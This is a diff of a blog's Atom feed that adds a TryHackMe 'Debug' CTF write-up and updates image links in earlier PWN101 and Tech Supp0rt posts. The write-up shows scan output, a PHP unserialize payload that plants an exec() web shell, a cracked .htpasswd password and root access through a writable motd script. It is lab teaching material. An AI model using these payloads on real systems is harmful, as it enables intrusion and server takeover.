@@ -1,4 +1,345 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/new_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/new_blog/" rel="alternate" type="text/html" /><updated>2022-05-08T17:45:14+00:00</updated><id>http://localhost:4000/new_blog/feed.xml</id><title type="html">The Awesome Blog</title><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><entry><title type="html">PWN101</title><link href="http://localhost:4000/new_blog/posts/PWN101-Tryhackme/" rel="alternate" type="text/html" title="PWN101" /><published>2022-04-29T10:18:00+00:00</published><updated>2022-04-29T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/PWN101-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/PWN101-Tryhackme/"><![CDATA[<blockquote>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/The_Awesome_Blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/The_Awesome_Blog/" rel="alternate" type="text/html" /><updated>2022-05-09T04:59:11+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/feed.xml</id><title type="html">The Awesome Blog</title><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><entry><title type="html">Debug</title><link href="http://localhost:4000/The_Awesome_Blog/posts/Debug-Tryhackme/" rel="alternate" type="text/html" title="Debug" /><published>2022-05-06T10:18:00+00:00</published><updated>2022-05-06T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/Debug-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/Debug-Tryhackme/"><![CDATA[<blockquote>
+  <p>VOiD XD</p>
+</blockquote>
+
+<blockquote>
+  <p>Target IP : 10.10.41.176</p>
+</blockquote>
+
+<p>This is short writup for <a href="https://tryhackme.com/room/debug">Debug</a> (Linux Machine CTF! You’ll learn about enumeration, finding hidden password files and how to exploit php deserialization!) on <a href="https://tryhackme.com">Tryhackme</a>
+Go check it out.</p>
+
+<h2 id="rustscan">Rustscan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rustscan <span class="nt">-a</span> 10.10.41.176 <span class="nt">-b</span> 1000 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
+| .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
+<span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[~] File limit higher than batch size. Can increase speed by increasing batch size '</span><span class="nt">-b</span> 924<span class="s1">'.
+Open 10.10.41.176:22
+Open 10.10.41.176:80
+[~] Starting Script(s)
+[&gt;] Script to be run Some("nmap -vvv -p  ")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 12:37 EDT
+Initiating Ping Scan at 12:37
+Scanning 10.10.41.176 [2 ports]
+Completed Ping Scan at 12:37, 0.31s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:37
+Completed Parallel DNS resolution of 1 host. at 12:37, 0.04s elapsed
+DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 12:37
+Scanning 10.10.41.176 [2 ports]
+Discovered open port 80/tcp on 10.10.41.176
+Discovered open port 22/tcp on 10.10.41.176
+Completed Connect Scan at 12:37, 0.30s elapsed (2 total ports)
+Nmap scan report for 10.10.41.176
+Host is up, received conn-refused (0.31s latency).
+Scanned at 2022-05-06 12:37:41 EDT for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
+
+</span></code></pre></div></div>
+
+<h2 id="nmap">Nmap</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-vv</span> 10.10.41.176 <span class="nt">-oN</span> scans/init 
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-06 12:37 EDT
+NSE: Loaded 155 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:37
+Completed NSE at 12:37, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:37
+Completed NSE at 12:37, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:37
+Completed NSE at 12:37, 0.00s elapsed
+Initiating Ping Scan at 12:37
+Scanning 10.10.41.176 <span class="o">[</span>2 ports]
+Completed Ping Scan at 12:37, 0.48s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating Parallel DNS resolution of 1 host. at 12:37
+Completed Parallel DNS resolution of 1 host. at 12:37, 0.14s elapsed
+Initiating Connect Scan at 12:37
+Scanning 10.10.41.176 <span class="o">[</span>1000 ports]
+Discovered open port 80/tcp on 10.10.41.176
+Discovered open port 22/tcp on 10.10.41.176
+Increasing send delay <span class="k">for </span>10.10.41.176 from 0 to 5 due to max_successful_tryno increase to 4
+Increasing send delay <span class="k">for </span>10.10.41.176 from 5 to 10 due to max_successful_tryno increase to 5
+Increasing send delay <span class="k">for </span>10.10.41.176 from 10 to 20 due to max_successful_tryno increase to 6
+Completed Connect Scan at 12:37, 35.95s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
+Initiating Service scan at 12:37
+Scanning 2 services on 10.10.41.176
+Completed Service scan at 12:38, 6.55s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
+NSE: Script scanning 10.10.41.176.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 10.20s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.97s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Nmap scan report <span class="k">for </span>10.10.41.176
+Host is up, received syn-ack <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-05-06 12:37:21 EDT <span class="k">for </span>53s
+Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h
+|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs<span class="o">=</span>
+|   256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb
+
+80/tcp open  http    syn-ack Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
+Initiating NSE at 12:38
+Completed NSE at 12:38, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>55.59 seconds
+</code></pre></div></div>
+
+<h2 id="gobuster">Gobuster</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.41.176/ <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/dirb/common.txt <span class="nt">-x</span> txt,php,html <span class="nt">-t</span> 40 | <span class="nb">tee </span>go.log
+
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.41.176/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 40
+<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              txt,php,html
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/05/06 12:39:34 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/backup               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.41.176/backup/]
+/grid                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.41.176/grid/]  
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]                                
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]                                
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5732]                                 
+/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5732]                                 
+/javascripts          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.41.176/javascripts/]
+/javascript           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.41.176/javascript/] 
+/message.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 94]                                        
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]                                       
+<span class="o">===============================================================</span>
+2022/05/06 12:42:25 Finished
+<span class="o">===============================================================</span>
+
+
+</code></pre></div></div>
+
+<h2 id="port-80-apache-httpd-2418">PORT 80 [Apache httpd 2.4.18]</h2>
+
+<p>http://10.10.41.176/backup/</p>
+
+<p>It contains some backups files of server.</p>
+
+<p><img src="/The_Awesome_Blog/all_collections/images/debug/Debug_backup.png" alt="Debug_backup.png" /></p>
+
+<p>http://10.10.41.176/index.php</p>
+
+<p>Has some message sending functionality.</p>
+
+<p>http://10.10.41.176/message.txt</p>
+
+<p>Displays the message sent.</p>
+
+<p><img src="/The_Awesome_Blog/all_collections/images/debug/Debug_message.png" alt="Debug_message.png" /></p>
+
+<p>Important php code of index.php from the backup.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="kd">class</span> <span class="nc">FormSubmit</span> <span class="p">{</span>
+
+<span class="k">public</span> <span class="nv">$form_file</span> <span class="o">=</span> <span class="s1">'message.txt'</span><span class="p">;</span>
+<span class="k">public</span> <span class="nv">$message</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="n">SaveMessage</span><span class="p">()</span> <span class="p">{</span>
+
+<span class="nv">$NameArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span> 
+<span class="nv">$EmailArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
+<span class="nv">$TextArea</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'comments'</span><span class="p">];</span>
+
+	<span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">message</span> <span class="o">=</span> <span class="s2">"Message From : "</span> <span class="mf">.</span> <span class="nv">$NameArea</span> <span class="mf">.</span> <span class="s2">" || From Email : "</span> <span class="mf">.</span> <span class="nv">$EmailArea</span> <span class="mf">.</span> <span class="s2">" || Comment : "</span> <span class="mf">.</span> <span class="nv">$TextArea</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
+
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">form_file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">message</span><span class="p">,</span><span class="no">FILE_APPEND</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s1">'Your submission has been successfully saved!'</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1">// Leaving this for now... only for debug purposes... do not touch!</span>
+
+<span class="nv">$debug</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$messageDebug</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$debug</span><span class="p">);</span>
+
+<span class="nv">$application</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormSubmit</span><span class="p">;</span>
+<span class="nv">$application</span> <span class="o">-&gt;</span> <span class="nf">SaveMessage</span><span class="p">();</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Here we can clearly see <code class="language-plaintext highlighter-rouge">unserialize</code> being used to the <code class="language-plaintext highlighter-rouge">GET parameter send from debug</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">FormSubmit</span> 
+<span class="p">{</span>
+
+        <span class="k">public</span> <span class="nv">$form_file</span> <span class="o">=</span> <span class="s1">'backup/shell.php'</span><span class="p">;</span>
+        <span class="k">public</span> <span class="nv">$message</span> <span class="o">=</span> <span class="s2">"&lt;?php%20echo%20exec(</span><span class="se">\$</span><span class="s2">_GET[cmd])%20?&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$serial</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">FormSubmit</span><span class="p">);</span>
+<span class="k">print</span> <span class="nv">$serial</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Payload : <code class="language-plaintext highlighter-rouge">O:10:"FormSubmit":2:{s:9:"form_file";s:16:"backup/shell.php";s:7:"message";s:30:"&lt;?php%20echo%20exec($_GET[cmd])%20?&gt;";}</code></p>
+
+<p>Sending it with burp</p>
+
+<p><img src="/The_Awesome_Blog/all_collections/images/debug/Debug_burp.png" alt="Debug_burp.png" /></p>
+
+<p>Gives the following web shell</p>
+
+<p><img src="/The_Awesome_Blog/all_collections/images/debug/Debug_webshell.png" alt="Debug_webshell.png" /></p>
+
+<p>Gaining reverse shell</p>
+
+<h2 id="user-www-data">USER [www-data]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@osboxes:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> .htpasswd 
+james:<span class="nv">$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1</span>
+
+
+ john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
+Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+jamaica          <span class="o">(</span>james<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2022-05-06 13:54<span class="o">)</span> 33.33g/s 25600p/s 25600c/s 25600C/s evelyn..james1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+                   
+</code></pre></div></div>
+
+<h2 id="user-james">USER [james]</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james:jamaica
+
+james@osboxes:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+7e37c84a66cc40b1c6bf700d08d28c20
+
+james@osboxes:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
+<span class="nb">ls
+</span>clear
+<span class="nb">exit
+ls
+</span>clear
+<span class="nb">exit
+ls
+</span>clear
+<span class="nb">exit
+ls
+cd</span> /home/james/
+<span class="nb">ls
+cat </span>Note-To-James.txt 
+<span class="nb">ls
+cd</span> /etc/update-motd.d/
+<span class="nb">ls
+ls</span> <span class="nt">-la</span>
+<span class="nb">ls
+</span>clear
+<span class="nb">ls
+</span>clear
+<span class="nb">ls
+</span>clera
+<span class="nb">ls
+</span>clear
+<span class="nb">ls
+</span>clear
+<span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">cd</span> /
+<span class="nb">ls
+cd</span> /root/
+<span class="nb">ls
+exit
+ls
+</span>clear
+<span class="nb">exit
+</span>nano id_rsa
+<span class="nb">chmod </span>600 id_rsa 
+ssh <span class="nt">-i</span> id_rsa root@10.250.0.12
+<span class="nb">exit
+
+
+</span>james@osboxes:~<span class="nv">$ </span><span class="nb">cd</span> /etc/update-motd.d/
+james@osboxes:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 44
+drwxr-xr-x   2 root root   4096 Mar 10  2021 <span class="nb">.</span>
+drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
+<span class="nt">-rwxrwxr-x</span>   1 root james  1452 May  6 14:11 00-header
+<span class="nt">-rwxrwxr-x</span>   1 root james     0 Mar 10  2021 00-header.save
+<span class="nt">-rwxrwxr-x</span>   1 root james  1157 Jun 14  2016 10-help-text
+<span class="nt">-rwxrwxr-x</span>   1 root james    97 Dec  7  2018 90-updates-available
+<span class="nt">-rwxrwxr-x</span>   1 root james   299 Jul 22  2016 91-release-upgrade
+<span class="nt">-rwxrwxr-x</span>   1 root james   142 Dec  7  2018 98-fsck-at-reboot
+<span class="nt">-rwxrwxr-x</span>   1 root james   144 Dec  7  2018 98-reboot-required
+<span class="nt">-rwxrwxr-x</span>   1 root james   604 Nov  5  2017 99-esm
+
+</code></pre></div></div>
+
+<p>These files are writeable by us. writing a reverse shell into 00-header and then loging into ssh gives us root shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@osboxes:/root# <span class="nb">cat </span>root.txt 
+3c8c3d0fe758c320d158e32f68fabf4b
+
+</code></pre></div></div>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Web" /><category term="Serialization" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">PWN101</title><link href="http://localhost:4000/The_Awesome_Blog/posts/PWN101-Tryhackme/" rel="alternate" type="text/html" title="PWN101" /><published>2022-04-29T10:18:00+00:00</published><updated>2022-04-29T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/PWN101-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/PWN101-Tryhackme/"><![CDATA[<blockquote>
   <p>Void XD</p>
 </blockquote>
 
@@ -50,7 +391,7 @@ So it needs some special input.
 
 <p>Using ghidra to get the source code</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn101.png" alt="pwn101.png" /></p>
+<p><img src="/The_Awesome_Blog/all_collections/images/pwn101/pwn101.png" alt="pwn101.png" /></p>
 
 <p>Here we can clearly see its checking if preset_value is 1337 if its not so we get shell.</p>
 
@@ -129,7 +470,7 @@ Am I right? <span class="nb">test
 
 <p>Using ghidra again to decomplie the source code.</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn102.png" alt="pwn102.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn102.png" alt="pwn102.png" /></p>
 
 <p>This time there are two preset value with value 0xbadf00d and 0xfee1dead we have to rewrite them to 0xc0ff33 and 0xc0d3</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Using gdb to get the offset <span class="k">for </span>these comparisions
@@ -253,9 +594,9 @@ zsh: segmentation fault  ./pwn103.pwn103
 
 <p>Ghidra Analysis give these two important functions</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn103_admins_only.png" alt="pwn103_admins_only.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn103_admins_only.png" alt="pwn103_admins_only.png" /></p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn103_general.png" alt="pwn103_general.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn103_general.png" alt="pwn103_general.png" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># important function</span>
 
@@ -417,7 +758,7 @@ test
 
 <p>Again ghidra for analysis</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn104.png" alt="pwn104.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn104.png" alt="pwn104.png" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># finding the rip offset</span>
 
@@ -551,7 +892,7 @@ checksec pwn105.pwn105
 
 <p>Ghidra analysis</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn105.png" alt="pwn105.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn105.png" alt="pwn105.png" /></p>
 
 <p>So first it takes two inputs then check if the are +ve or not if they are not it tells you nice try else it will sum both the values and if the sum is less than 0 it pops a shell.</p>
 
@@ -620,7 +961,7 @@ Thanks void
 
 <p>Ghidra analysis</p>
 
-<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn106.png" alt="pwn106.png" /></p>
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/The_Awesome_Blog/main/all_collections/_posts/images/pwn101/pwn106.png" alt="pwn106.png" /></p>
 
 <p>Here we can clearly see that it takes a input from us and then print it back to up … but here’s the twist as the programmer dosen’t specify format specifier we can provide our own format specifier to leak values from the stack.</p>
 
@@ -699,7 +1040,7 @@ checksec pwn107.pwn107
 
 </code></pre></div></div>
 
-<p>Comming soon…</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Pwn" /><category term="Tryhackme" /><summary type="html"><![CDATA[Void XD]]></summary></entry><entry><title type="html">Tech Supp0rt 1</title><link href="http://localhost:4000/new_blog/posts/Tech_Supp0rt-1-Tryhackme/" rel="alternate" type="text/html" title="Tech Supp0rt 1" /><published>2022-04-19T10:18:00+00:00</published><updated>2022-04-19T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/Tech_Supp0rt:-1-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/Tech_Supp0rt-1-Tryhackme/"><![CDATA[<blockquote>
+<p>Comming soon…</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Pwn" /><category term="Tryhackme" /><summary type="html"><![CDATA[Void XD]]></summary></entry><entry><title type="html">Tech Supp0rt 1</title><link href="http://localhost:4000/The_Awesome_Blog/posts/Tech_Supp0rt-1-Tryhackme/" rel="alternate" type="text/html" title="Tech Supp0rt 1" /><published>2022-04-19T10:18:00+00:00</published><updated>2022-04-19T10:18:00+00:00</updated><id>http://localhost:4000/The_Awesome_Blog/posts/Tech_Supp0rt:-1-Tryhackme</id><content type="html" xml:base="http://localhost:4000/The_Awesome_Blog/posts/Tech_Supp0rt-1-Tryhackme/"><![CDATA[<blockquote>
   <p>VOiD XD</p>
 </blockquote>
 
@@ -1328,7 +1669,7 @@ root@10.10.203.0<span class="s1">'s password:
 but still ask password
 </span></code></pre></div></div>
 
-<p>That all for this room hope you learnt something !</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="Web" /><category term="Subrion" /><category term="Tryhackme" /><summary type="html"><![CDATA[VOiD XD]]></summary></entry><entry><title type="html">StuxCTF</title><link href="http://localhost:4000/new_blog/posts/stuxctf-Tryhackme/" rel="alternate" type="text/html" title="StuxCTF" /><published>2022-04-19T10:18:00+00:00</published><updated>2022-04-19T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/stuxctf-Tryhackme</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/stuxctf-Tryhackme/"><![CDATA[<blockquote>
